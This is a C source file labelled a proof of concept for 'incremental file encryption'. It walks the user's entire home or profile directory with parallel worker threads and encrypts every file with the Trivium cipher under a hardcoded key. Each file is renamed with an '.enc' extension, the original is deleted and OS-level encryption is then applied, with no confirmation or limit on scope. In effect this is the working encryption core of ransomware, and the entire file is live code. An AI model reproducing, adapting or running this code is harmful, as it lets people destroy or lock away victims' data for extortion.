/*
 * PoC: Cross-platform incremental file encryption with Trivium cipher,
 *       file-system index fallback, OS-level encryption, parallelism,
 *       and atomic replacement.
 *
 * Configuration parameters are at the top of this file.
 */

#define _XOPEN_SOURCE 500   /* for nftw on Linux */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>

#ifdef _WIN32
  #include <windows.h>
  #include <shlobj.h>
  #include <tchar.h>
  #define PATH_SEP '\\'
  #define MAX_PATH_LEN MAX_PATH
#else
  #include <ftw.h>
  #include <pthread.h>
  #include <unistd.h>
  #include <fcntl.h>
  #include <sys/ioctl.h>
  #include <linux/fs.h>
  #define PATH_SEP '/'
  #define MAX_PATH_LEN 4096
#endif

/* Include Trivium cipher implementation */
#include "wip_trivium_2304.c"

/*—— Configuration ——*/
#define EXTENSION           ".enc"      /* user-defined encrypted extension */
#define NUM_THREADS         4           /* default number of worker threads */
#define KEY_HEX             "0123456789ABCDEF0123"  /* 20 hex digits (80-bit key) */
#define TEMP_SUFFIX_MIN     2           /* random suffix length in bytes (min) */
#define TEMP_SUFFIX_MAX     24          /* random suffix length in bytes (max) */
/*———————————————————*/

typedef struct file_node {
    char *path;
    struct file_node *next;
} file_node_t;

typedef struct {
    file_node_t *head, *tail;
    int done;
#ifdef _WIN32
    CRITICAL_SECTION cs;
    CONDITION_VARIABLE  cv;
#else
    pthread_mutex_t     mutex;
    pthread_cond_t      cond;
#endif
} queue_t;

static queue_t file_queue;

/*—— Forward declarations ——*/
static void queue_init(queue_t *q);
static void queue_push(queue_t *q, const char *path);
static char *queue_pop(queue_t *q);
static void queue_done(queue_t *q);

static void *worker_thread(void *arg);
static void traverse_with_index(const char *root);
static void traverse_recursive(const char *path);

static int  process_file(const char *filepath);
static void os_encrypt_file(const char *path);
static void generate_random_hex(char *out, int byte_len);

/*—— Queue implementation ——*/
static void queue_init(queue_t *q) {
    q->head = q->tail = NULL;
    q->done = 0;
#ifdef _WIN32
    InitializeCriticalSection(&q->cs);
    InitializeConditionVariable(&q->cv);
#else
    pthread_mutex_init(&q->mutex, NULL);
    pthread_cond_init(&q->cond, NULL);
#endif
}

static void queue_push(queue_t *q, const char *path) {
    file_node_t *node = malloc(sizeof(*node));
    if (!node) return;
    node->path = strdup(path);
    node->next = NULL;

#ifdef _WIN32
    EnterCriticalSection(&q->cs);
    if (q->tail) q->tail->next = node;
    else         q->head = node;
    q->tail = node;
    WakeConditionVariable(&q->cv);
    LeaveCriticalSection(&q->cs);
#else
    pthread_mutex_lock(&q->mutex);
    if (q->tail) q->tail->next = node;
    else         q->head = node;
    q->tail = node;
    pthread_cond_signal(&q->cond);
    pthread_mutex_unlock(&q->mutex);
#endif
}

static char *queue_pop(queue_t *q) {
    char *path;
#ifdef _WIN32
    EnterCriticalSection(&q->cs);
    while (!q->head && !q->done)
        SleepConditionVariableCS(&q->cv, &q->cs, INFINITE);
    if (!q->head) {
        LeaveCriticalSection(&q->cs);
        return NULL;
    }
    file_node_t *node = q->head;
    q->head = node->next;
    if (!q->head) q->tail = NULL;
    LeaveCriticalSection(&q->cs);
#else
    pthread_mutex_lock(&q->mutex);
    while (!q->head && !q->done)
        pthread_cond_wait(&q->cond, &q->mutex);
    if (!q->head) {
        pthread_mutex_unlock(&q->mutex);
        return NULL;
    }
    file_node_t *node = q->head;
    q->head = node->next;
    if (!q->head) q->tail = NULL;
    pthread_mutex_unlock(&q->mutex);
#endif

    path = node->path;
    free(node);
    return path;
}

static void queue_done(queue_t *q) {
#ifdef _WIN32
    EnterCriticalSection(&q->cs);
    q->done = 1;
    WakeAllConditionVariable(&q->cv);
    LeaveCriticalSection(&q->cs);
#else
    pthread_mutex_lock(&q->mutex);
    q->done = 1;
    pthread_cond_broadcast(&q->cond);
    pthread_mutex_unlock(&q->mutex);
#endif
}

/*—— Worker thread ——*/
static void *worker_thread(void *arg) {
    (void)arg;
    for (;;) {
        char *path = queue_pop(&file_queue);
        if (!path) break;
        process_file(path);
        free(path);
    }
    return NULL;
}

/*—— File discovery: try system index, fallback to recursive ——*/
static void traverse_with_index(const char *root) {
#ifdef __linux__
    /* Attempt locate(1) with null delimiters */
    char cmd[MAX_PATH_LEN + 32];
    snprintf(cmd, sizeof(cmd),
             "locate -r '^%s/.*' -0 2>/dev/null", root);
    FILE *pipe = popen(cmd, "r");
    if (pipe) {
        char buf[MAX_PATH_LEN];
        int idx = 0, c;
        while ((c = fgetc(pipe)) != EOF) {
            if (c == '\0') {
                buf[idx] = '\0';
                queue_push(&file_queue, buf);
                idx = 0;
            } else if (idx < (int)sizeof(buf)-1) {
                buf[idx++] = c;
            }
        }
        pclose(pipe);
        return;
    }
#endif

    /* Fallback to recursive traversal */
    traverse_recursive(root);
}

#ifdef __linux__
/* nftw callback */
static int nftw_callback(const char *fpath, const struct stat *sb,
                         int typeflag, struct FTW *ftwbuf) {
    (void)sb; (void)ftwbuf;
    if (typeflag == FTW_F)
        queue_push(&file_queue, fpath);
    return 0;
}

static void traverse_recursive(const char *path) {
    /* follow symlinks (no FTW_PHYS flag) */
    nftw(path, nftw_callback, 16, 0);
}
#else
/* Windows recursive traversal with FindFirstFileEx hinting index */
static void traverse_recursive_windows(const char *dir) {
    char pattern[MAX_PATH_LEN];
    snprintf(pattern, MAX_PATH_LEN, "%s\\*", dir);
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileExA(
        pattern,
        FindExInfoBasic,
        &fd,
        FindExSearchNameMatch,
        NULL,
        0
    );
    if (h == INVALID_HANDLE_VALUE) return;
    do {
        if (strcmp(fd.cFileName, ".") == 0 ||
            strcmp(fd.cFileName, "..") == 0)
            continue;
        char child[MAX_PATH_LEN];
        snprintf(child, MAX_PATH_LEN, "%s\\%s", dir, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            traverse_recursive_windows(child);
        else
            queue_push(&file_queue, child);
    } while (FindNextFileA(h, &fd));
    FindClose(h);
}

static void traverse_recursive(const char *path) {
    traverse_recursive_windows(path);
}
#endif

/*—— Process one file: encrypt, atomic replace, OS-level encrypt ——*/
static int process_file(const char *filepath) {
    size_t len = strlen(filepath);
    size_t extlen = strlen(EXTENSION);
    /* skip already-encrypted */
    if (len > extlen &&
        strcmp(filepath + len - extlen, EXTENSION) == 0)
        return 0;

    /* build temp and final paths */
    int suffix_bytes = (rand() % (TEMP_SUFFIX_MAX - TEMP_SUFFIX_MIN + 1))
                       + TEMP_SUFFIX_MIN;
    char hexsuffix[TEMP_SUFFIX_MAX*2 + 1];
    generate_random_hex(hexsuffix, suffix_bytes);

    char tmp[MAX_PATH_LEN + extlen + TEMP_SUFFIX_MAX*2 + 8];
    char enc[MAX_PATH_LEN + extlen + 1];
    snprintf(tmp, sizeof(tmp), "%s%s.%s.tmp",
             filepath, EXTENSION, hexsuffix);
    snprintf(enc, sizeof(enc), "%s%s", filepath, EXTENSION);

    /* encrypt via Trivium */
    unsigned char key[KEY_BITS/8];
    if (parse_key(KEY_HEX, key) != 0) return -1;

    FILE *fin = fopen(filepath, "rb");
    if (!fin) return -1;
    FILE *fout = fopen(tmp, "wb");
    if (!fout) { fclose(fin); return -1; }

    /* generate and write IV */
    unsigned char iv[IV_BITS/8];
    if (generate_random_bytes(iv, sizeof(iv)) != 0) {
        fclose(fin); fclose(fout);
        return -1;
    }
    if (fwrite(iv, 1, sizeof(iv), fout) != sizeof(iv)) {
        fclose(fin); fclose(fout);
        return -1;
    }

    /* initialize Trivium */
    {
        int state[STATE_SIZE];
        int kb[KEY_BITS], vb[IV_BITS];
        bytes_to_bits(key, sizeof(key), kb);
        bytes_to_bits(iv , sizeof(iv), vb);
        trivium_init(state, kb, vb);

        /* encrypt stream */
        unsigned char buf[BLOCK_SIZE];
        size_t r;
        while ((r = fread(buf, 1, BLOCK_SIZE, fin)) > 0) {
            for (size_t i = 0; i < r; i++) {
                buf[i] ^= get_keystream_byte(state);
            }
            if (fwrite(buf, 1, r, fout) != r) {
                fclose(fin); fclose(fout);
                secure_clear(state, sizeof(state));
                secure_clear(key, sizeof(key));
                return -1;
            }
        }
        secure_clear(state, sizeof(state));
    }

    fclose(fin);
    fclose(fout);
    secure_clear(key, sizeof(key));

    /* atomic rename to final .enc */
#ifdef _WIN32
    if (!MoveFileExA(tmp, enc, MOVEFILE_REPLACE_EXISTING))
        return -1;
#else
    if (rename(tmp, enc) != 0)
        return -1;
#endif

    /* delete original */
    remove(filepath);

    /* invoke OS-level encryption */
    os_encrypt_file(enc);

    return 0;
}

/*—— OS-level encryption stub ——*/
static void os_encrypt_file(const char *path) {
#ifdef _WIN32
    wchar_t wpath[MAX_PATH_LEN];
    MultiByteToWideChar(CP_UTF8, 0, path, -1, wpath, MAX_PATH_LEN);
    EncryptFileW(wpath);
#else
    int fd = open(path, O_RDONLY);
    if (fd >= 0) {
        ioctl(fd, FS_IOC_ENABLE_ENCRYPTION, 0);
        close(fd);
    }
#endif
}

/*—— generate random hex string of byte_len bytes ——*/
static void generate_random_hex(char *out, int byte_len) {
    unsigned char buf[TEMP_SUFFIX_MAX];
    generate_random_bytes(buf, byte_len);
    for (int i = 0; i < byte_len; i++)
        sprintf(out + i*2, "%02X", buf[i]);
    out[byte_len*2] = '\0';
}

/*—— Entry point ——*/
int main(void) {
    /* seed PRNG for temp suffix */
    srand((unsigned)time(NULL));

    /* determine user root directory */
    char root[MAX_PATH_LEN];
#ifdef _WIN32
    if (!SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, root))
        ; /* use root */
    else
        strcpy(root, getenv("USERPROFILE"));
#else
    char *h = getenv("HOME");
    if (h) strncpy(root, h, sizeof(root));
    else      strncpy(root, "/", sizeof(root));
#endif

    /* initialize queue and workers */
    queue_init(&file_queue);
#ifdef _WIN32
    HANDLE threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++) {
        threads[i] = CreateThread(
            NULL, 0, (LPTHREAD_START_ROUTINE)worker_thread,
            NULL, 0, NULL
        );
    }
#else
    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++)
        pthread_create(&threads[i], NULL, worker_thread, NULL);
#endif

    /* produce file list */
    traverse_with_index(root);

    /* signal completion and join */
    queue_done(&file_queue);
#ifdef _WIN32
    WaitForMultipleObjects(NUM_THREADS, threads, TRUE, INFINITE);
    for (int i = 0; i < NUM_THREADS; i++)
        CloseHandle(threads[i]);
#else
    for (int i = 0; i < NUM_THREADS; i++)
        pthread_join(threads[i], NULL);
#endif

    return 0;
}
